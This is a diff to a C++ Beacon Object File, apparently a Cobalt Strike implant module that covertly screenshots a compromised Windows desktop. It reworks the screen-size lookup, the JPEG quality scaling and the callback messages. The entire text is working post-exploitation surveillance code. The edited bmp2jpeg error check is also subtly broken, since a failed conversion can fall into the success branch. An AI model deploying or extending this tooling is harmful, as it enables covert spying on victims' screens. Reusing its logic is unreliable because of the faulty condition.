@@ -42,6 +42,7 @@ struct Functions
     decltype(GetObjectW)* GetObjectW;
     decltype(GetCurrentObject)* GetCurrentObject;
     decltype(ExpandEnvironmentStringsA)* ExpandEnvironmentStringsA;
+
     //decltype()* ;
 };
 
@@ -8020,18 +8021,6 @@ BOOL bmp2jpeg(uint8_t* bmp_bytes, size_t bmp_size, int width, int height, int qu
     return TRUE;
 }
 
-int get_screen_size(HDC dc, DWORD* width, DWORD* height)
-{
-    BITMAP all_desktops{};
-    HGDIOBJ bitmap = functions.GetCurrentObject(dc, OBJ_BITMAP);
-    functions.GetObjectW(bitmap, sizeof(BITMAP), &all_desktops);
-
-    *width = all_desktops.bmWidth;
-    *height = all_desktops.bmHeight;
-    functions.DeleteObject(bitmap);
-    return 1;
-}
-
 #if BOF_TEST_MODE == 0
 void post_screenshot(void* data, int length)
 {
@@ -8090,6 +8079,27 @@ int get_temp_path(char* buf, int length)
 
 #endif
 
+int get_screen_size(HDC dc, DWORD& width, DWORD& height)
+{
+    BITMAP all_desktops{};
+    HGDIOBJ bitmap = functions.GetCurrentObject(dc, OBJ_BITMAP);
+    functions.GetObjectW(bitmap, sizeof(BITMAP), &all_desktops);
+    functions.DeleteObject(bitmap);
+
+    if (all_desktops.bmWidth == 0 || all_desktops.bmHeight == 0) {
+        int w = GetSystemMetrics(SM_CXVIRTUALSCREEN);
+        int h = GetSystemMetrics(SM_CYVIRTUALSCREEN);
+        int left = GetSystemMetrics(SM_XVIRTUALSCREEN);
+        int top = GetSystemMetrics(SM_YVIRTUALSCREEN);
+        width = w - left;
+        height = h - top;
+    } else {
+        width = all_desktops.bmWidth;
+        height = all_desktops.bmHeight;
+    }
+    return 1;
+}
+
 void take_screenshot(int quality, const char* path = nullptr)
 {
     BITMAPINFO info;
@@ -8112,7 +8122,7 @@ void take_screenshot(int quality, const char* path = nullptr)
         return;
     }
 
-    if (!get_screen_size(dc, &width, &height) || width == 0 || height > 100000) {
+    if (!get_screen_size(dc, width, height) || width == 0 || height > 100000) {
         BeaconPrintf(CALLBACK_ERROR, "could not get size of screen (screen may be locked)");
         goto _END;
     }
@@ -8138,7 +8148,11 @@ void take_screenshot(int quality, const char* path = nullptr)
         goto _END;
     }
 
-    if (bmp2jpeg(bits, cbits, width, height, quality, &jpeg_memory, &jpeg_size) && jpeg_memory && jpeg_size) {
+    if (!bmp2jpeg(bits, cbits, width, height, quality, &jpeg_memory, &jpeg_size) && jpeg_memory && jpeg_size) {
+        BeaconPrintf(CALLBACK_ERROR, "bmp2jpeg returns unexpected status...");
+        goto _END;
+    }
+    else {
 #if BOF_TEST_MODE
         char buf[256];
         if (path == NULL) {
@@ -8224,11 +8238,11 @@ extern "C" void go(char* arg, int alen)
     }
 
     int quality = atoi(arg);
-    quality *= 2;
-    if (quality < 10 || quality > 200) {
+    if (quality < 10 || quality > 100) {
         quality = 50;
     }
 
-    take_screenshot(quality);
+    BeaconPrintf(CALLBACK_OUTPUT, "taking screenshot with %d%% quality", quality);
+    take_screenshot(quality * 2);
 }
 #endif
